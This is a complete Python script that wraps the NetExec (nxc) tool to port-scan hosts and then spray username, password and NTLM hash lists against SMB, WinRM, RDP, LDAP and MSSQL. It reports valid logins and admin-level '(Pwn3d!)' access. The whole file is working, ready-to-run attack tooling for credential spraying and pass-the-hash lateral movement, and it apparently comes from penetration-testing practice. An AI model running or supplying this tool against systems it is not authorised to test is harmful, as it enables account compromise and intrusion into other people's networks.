#!/usr/bin/env python3
"""
nxc_credspray.py - NetExec Credential Spray Wrapper

Scans targets for open ports and automatically tests credentials
on all discovered protocols using NetExec (nxc).
"""

import argparse
import socket
import subprocess
import sys
import os
import re
import pty
import select
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Set, Tuple, Optional


# ANSI Color codes - matching nxc style
class Colors:
    # nxc uses these standard ANSI colors
    RED = '\033[1;31m'
    GREEN = '\033[1;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[1;34m'
    MAGENTA = '\033[1;35m'
    CYAN = '\033[1;36m'
    WHITE = '\033[1;37m'

    # Reset
    RESET = '\033[0m'

    # Dim
    DIM = '\033[2m'


def print_banner():
    """Print the tool banner."""
    banner = f"""
{Colors.BLUE}╔══════════════════════════════════════════════════════════════╗
║{Colors.WHITE}          NXC CREDSPRAY - NetExec Credential Wrapper          {Colors.BLUE}║
║{Colors.DIM}              Scan & Spray on All Protocols                  {Colors.RESET}{Colors.BLUE}║
╚══════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
    print(banner)


# Protocol to port mapping (no SSH)
PROTOCOLS = {
    'smb': [445],
    'winrm': [5985, 5986],
    'rdp': [3389],
    'ldap': [389, 636],
    'mssql': [1433],
}

# Protocol colors - matching nxc's color scheme
PROTOCOL_COLORS = {
    'smb': Colors.BLUE,
    'winrm': Colors.RED,
    'rdp': Colors.CYAN,
    'ldap': Colors.CYAN,
    'mssql': Colors.MAGENTA,
}

# Reverse mapping: port to protocol
PORT_TO_PROTOCOL = {}
for proto, ports in PROTOCOLS.items():
    for port in ports:
        PORT_TO_PROTOCOL[port] = proto


def parse_targets(target_input: str) -> List[str]:
    """Parse target input - either a file or single IP/hostname."""
    targets = []

    # Try to read as file first
    try:
        with open(target_input, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    targets.append(line)
    except FileNotFoundError:
        # Treat as single target
        targets.append(target_input)

    return targets


def scan_port(target: str, port: int, timeout: float = 2.0) -> bool:
    """Check if a port is open on target."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((target, port))
        sock.close()
        return result == 0
    except (socket.error, socket.herror, socket.gaierror, socket.timeout):
        return False


def scan_target(target: str) -> Dict[str, Set[int]]:
    """Scan all relevant ports on a target and return open protocols."""
    open_protocols: Dict[str, Set[int]] = {}

    all_ports = []
    for ports in PROTOCOLS.values():
        all_ports.extend(ports)

    # Scan all ports in parallel
    with ThreadPoolExecutor(max_workers=20) as executor:
        future_to_port = {
            executor.submit(scan_port, target, port): port
            for port in all_ports
        }

        for future in as_completed(future_to_port):
            port = future_to_port[future]
            try:
                if future.result():
                    protocol = PORT_TO_PROTOCOL[port]
                    if protocol not in open_protocols:
                        open_protocols[protocol] = set()
                    open_protocols[protocol].add(port)
            except Exception:
                pass

    return open_protocols


def scan_all_targets(targets: List[str]) -> Dict[str, Dict[str, Set[int]]]:
    """Scan all targets and return open protocols per target."""
    print(f"\n{Colors.BLUE}{'═' * 62}")
    print(f" {Colors.WHITE}PORT SCAN PHASE{Colors.RESET}")
    print(f"{Colors.BLUE}{'═' * 62}{Colors.RESET}")

    results: Dict[str, Dict[str, Set[int]]] = {}

    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_target = {
            executor.submit(scan_target, target): target
            for target in targets
        }

        for future in as_completed(future_to_target):
            target = future_to_target[future]
            try:
                open_protocols = future.result()
                results[target] = open_protocols

                if open_protocols:
                    protocols_str = ', '.join(
                        f"{PROTOCOL_COLORS.get(proto, Colors.WHITE)}{proto}{Colors.RESET}({Colors.DIM}{','.join(map(str, sorted(ports)))}{Colors.RESET})"
                        for proto, ports in sorted(open_protocols.items())
                    )
                    print(f"{Colors.GREEN}[+]{Colors.RESET} {Colors.WHITE}{target}{Colors.RESET}: {protocols_str}")
                else:
                    print(f"{Colors.RED}[-]{Colors.RESET} {Colors.DIM}{target}: No open ports found{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.YELLOW}[!]{Colors.RESET} {target}: Scan error - {e}")

    return results


def run_nxc(protocol: str, target: str, user_arg: str, cred_arg: str,
            cred_type: str, extra_args: List[str]) -> Tuple[str, List[str]]:
    """Run nxc command and capture output, preserving nxc's native colors."""

    cmd = ['nxc', protocol, target]
    cmd.extend(['-u', user_arg])

    if cred_type == 'password':
        cmd.extend(['-p', cred_arg])
    elif cred_type == 'hash':
        cmd.extend(['-H', cred_arg])

    cmd.extend(extra_args)

    successes = []
    full_output = []

    # Show command being executed
    cmd_display = ' '.join(cmd)
    print(f"{Colors.DIM}$ {cmd_display}{Colors.RESET}\n")

    try:
        # Use PTY to preserve nxc's color output
        master_fd, slave_fd = pty.openpty()

        process = subprocess.Popen(
            cmd,
            stdout=slave_fd,
            stderr=slave_fd,
            stdin=slave_fd,
            close_fds=True
        )

        os.close(slave_fd)

        # Read output from PTY
        output_buffer = ""
        while True:
            try:
                ready, _, _ = select.select([master_fd], [], [], 0.1)
                if ready:
                    data = os.read(master_fd, 1024)
                    if not data:
                        break
                    decoded = data.decode('utf-8', errors='replace')
                    output_buffer += decoded

                    # Process complete lines
                    while '\n' in output_buffer:
                        line, output_buffer = output_buffer.split('\n', 1)
                        line = line.rstrip('\r')
                        if line:
                            full_output.append(line)
                            # Print with nxc's native colors preserved
                            print(line)

                            # Check for success (strip ANSI codes for detection)
                            clean_line = re.sub(r'\x1b\[[0-9;]*m', '', line)
                            if '[+]' in clean_line:
                                success_entry = parse_success_line(protocol, clean_line, cred_type)
                                if success_entry:
                                    successes.append(success_entry)

                elif process.poll() is not None:
                    # Process finished, read any remaining data
                    try:
                        while True:
                            data = os.read(master_fd, 1024)
                            if not data:
                                break
                            decoded = data.decode('utf-8', errors='replace')
                            for line in decoded.split('\n'):
                                line = line.rstrip('\r')
                                if line:
                                    full_output.append(line)
                                    print(line)
                                    clean_line = re.sub(r'\x1b\[[0-9;]*m', '', line)
                                    if '[+]' in clean_line:
                                        success_entry = parse_success_line(protocol, clean_line, cred_type)
                                        if success_entry:
                                            successes.append(success_entry)
                    except OSError:
                        pass
                    break

            except OSError:
                break

        os.close(master_fd)
        process.wait()

    except FileNotFoundError:
        print(f"{Colors.RED}[!] Error: nxc not found. Please install NetExec.{Colors.RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"{Colors.RED}[!] Error running nxc: {e}{Colors.RESET}")

    return '\n'.join(full_output), successes


def parse_success_line(protocol: str, line: str, cred_type: str) -> Optional[Dict]:
    """Parse a success line from nxc output and return structured data."""
    if '[+]' not in line:
        return None

    result = {
        'protocol': protocol.upper(),
        'line': line,
        'cred_type': cred_type,
        'pwned': '(Pwn3d!)' in line
    }

    # Try to extract target IP
    ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
    if ip_match:
        result['target'] = ip_match.group(1)

    return result


def print_phase_header(title: str, subtitle: str = ""):
    """Print a formatted phase header."""
    print(f"\n{Colors.BLUE}{'═' * 62}")
    print(f" {Colors.WHITE}{title}{Colors.RESET}")
    if subtitle:
        print(f" {Colors.DIM}{subtitle}{Colors.RESET}")
    print(f"{Colors.BLUE}{'═' * 62}{Colors.RESET}")


def print_test_header(protocol: str, target: str, cred_type: str):
    """Print a header for each test."""
    proto_color = PROTOCOL_COLORS.get(protocol, Colors.WHITE)
    print(f"\n{Colors.BLUE}{'─' * 62}{Colors.RESET}")
    print(f"{Colors.BLUE}[*]{Colors.RESET} Testing {proto_color}{protocol.upper()}{Colors.RESET} on {Colors.WHITE}{target}{Colors.RESET} {Colors.DIM}({cred_type}){Colors.RESET}")
    print(f"{Colors.BLUE}{'─' * 62}{Colors.RESET}")


def main():
    parser = argparse.ArgumentParser(
        description='NetExec Credential Spray Wrapper - Test credentials on all open protocols',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f'''
{Colors.WHITE}Examples:{Colors.RESET}
  {Colors.GREEN}%(prog)s -t targets.txt -u users.txt -p passwords.txt{Colors.RESET}
  {Colors.GREEN}%(prog)s -t 192.168.1.10 -u admin -p Password123{Colors.RESET}
  {Colors.GREEN}%(prog)s -t targets.txt -u users.txt -H hashes.txt --local-auth{Colors.RESET}
  {Colors.GREEN}%(prog)s -t targets.txt -u users.txt -p passwords.txt -H hashes.txt{Colors.RESET}
  {Colors.DIM}(tests passwords first, then hashes){Colors.RESET}
        '''
    )

    parser.add_argument('-t', '--target', required=True,
                        help='Target file or single IP/hostname')
    parser.add_argument('-u', '--user', required=True,
                        help='Username file or single username')
    parser.add_argument('-p', '--password',
                        help='Password file or single password')
    parser.add_argument('-H', '--hash',
                        help='Hash file or single hash (NTLM) - can be combined with -p')
    parser.add_argument('--protocols',
                        help='Comma-separated list of protocols to test (default: all open)')
    parser.add_argument('--skip-scan', action='store_true',
                        help='Skip port scan and test all protocols')
    parser.add_argument('--timeout', type=float, default=2.0,
                        help='Port scan timeout in seconds (default: 2.0)')

    # Capture all remaining arguments to pass to nxc
    args, extra_args = parser.parse_known_args()

    # Print banner
    print_banner()

    # Validate credential input - now allow both or either
    if not args.password and not args.hash:
        print(f"{Colors.RED}[!] Error: Either -p/--password or -H/--hash is required{Colors.RESET}")
        parser.print_help()
        sys.exit(1)

    # Build list of credential tests to run
    cred_tests = []
    if args.password:
        cred_tests.append(('password', args.password))
    if args.hash:
        cred_tests.append(('hash', args.hash))

    # Parse targets
    targets = parse_targets(args.target)
    print(f"{Colors.BLUE}[*]{Colors.RESET} Loaded {Colors.CYAN}{len(targets)}{Colors.RESET} target(s)")

    # Filter protocols if specified
    allowed_protocols = None
    if args.protocols:
        allowed_protocols = set(args.protocols.lower().split(','))
        proto_list = ', '.join(f"{PROTOCOL_COLORS.get(p, Colors.WHITE)}{p}{Colors.RESET}" for p in allowed_protocols)
        print(f"{Colors.BLUE}[*]{Colors.RESET} Filtering to protocols: {proto_list}")

    # Scan targets or skip
    if args.skip_scan:
        print(f"{Colors.YELLOW}[*]{Colors.RESET} Skipping port scan - testing all protocols")
        scan_results = {
            target: {proto: set(ports) for proto, ports in PROTOCOLS.items()}
            for target in targets
        }
    else:
        scan_results = scan_all_targets(targets)

    # Collect all protocol/target combinations to test
    test_combinations: List[Tuple[str, str]] = []
    for target, protocols in scan_results.items():
        for protocol in protocols:
            if allowed_protocols is None or protocol in allowed_protocols:
                test_combinations.append((protocol, target))

    if not test_combinations:
        print(f"\n{Colors.RED}[!] No open protocols found on any target{Colors.RESET}")
        sys.exit(0)

    # Show test plan
    cred_types_str = " + ".join(f"{Colors.CYAN}{ct[0]}s{Colors.RESET}" for ct in cred_tests)
    print_phase_header(
        "CREDENTIAL TESTING PHASE",
        f"Testing {len(test_combinations)} combinations with {cred_types_str}"
    )

    print(f"\n{Colors.BLUE}[*]{Colors.RESET} User input: {Colors.CYAN}{args.user}{Colors.RESET}")
    if args.password:
        print(f"{Colors.BLUE}[*]{Colors.RESET} Password input: {Colors.CYAN}{args.password}{Colors.RESET}")
    if args.hash:
        print(f"{Colors.BLUE}[*]{Colors.RESET} Hash input: {Colors.CYAN}{args.hash}{Colors.RESET}")
    if extra_args:
        print(f"{Colors.BLUE}[*]{Colors.RESET} Extra nxc options: {Colors.DIM}{' '.join(extra_args)}{Colors.RESET}")

    # Run credential tests
    all_successes = []

    for cred_type, cred_arg in cred_tests:
        if len(cred_tests) > 1:
            print(f"\n{Colors.MAGENTA}{'═' * 62}")
            print(f" TESTING WITH {cred_type.upper()}S")
            print(f"{'═' * 62}{Colors.RESET}")

        for protocol, target in test_combinations:
            print_test_header(protocol, target, cred_type)

            output, successes = run_nxc(
                protocol, target, args.user, cred_arg, cred_type, extra_args
            )
            all_successes.extend(successes)

    # Print summary
    print(f"\n{Colors.GREEN}{'═' * 62}")
    print(f" {Colors.WHITE}SUMMARY - SUCCESSFUL AUTHENTICATIONS{Colors.RESET}")
    print(f"{Colors.GREEN}{'═' * 62}{Colors.RESET}")

    if all_successes:
        # Group by credential type
        password_successes = [s for s in all_successes if s['cred_type'] == 'password']
        hash_successes = [s for s in all_successes if s['cred_type'] == 'hash']

        if password_successes:
            print(f"\n{Colors.CYAN}Password Authentication:{Colors.RESET}")
            for success in password_successes:
                proto_color = PROTOCOL_COLORS.get(success['protocol'].lower(), Colors.WHITE)
                pwn_indicator = f" {Colors.YELLOW}(Pwn3d!){Colors.RESET}" if success['pwned'] else ""
                print(f"  {Colors.GREEN}[+]{Colors.RESET} {proto_color}{success['protocol']}{Colors.RESET} {success['line']}{pwn_indicator}")

        if hash_successes:
            print(f"\n{Colors.MAGENTA}Hash Authentication:{Colors.RESET}")
            for success in hash_successes:
                proto_color = PROTOCOL_COLORS.get(success['protocol'].lower(), Colors.WHITE)
                pwn_indicator = f" {Colors.YELLOW}(Pwn3d!){Colors.RESET}" if success['pwned'] else ""
                print(f"  {Colors.GREEN}[+]{Colors.RESET} {proto_color}{success['protocol']}{Colors.RESET} {success['line']}{pwn_indicator}")

        print(f"\n{Colors.GREEN}[+] Total successful: {len(all_successes)}{Colors.RESET}")

        pwned_count = sum(1 for s in all_successes if s['pwned'])
        if pwned_count > 0:
            print(f"{Colors.YELLOW}[!] PWNED ACCOUNTS: {pwned_count}{Colors.RESET}")
    else:
        print(f"\n{Colors.RED}[-] No successful authentications found{Colors.RESET}")

    print()


if __name__ == '__main__':
    main()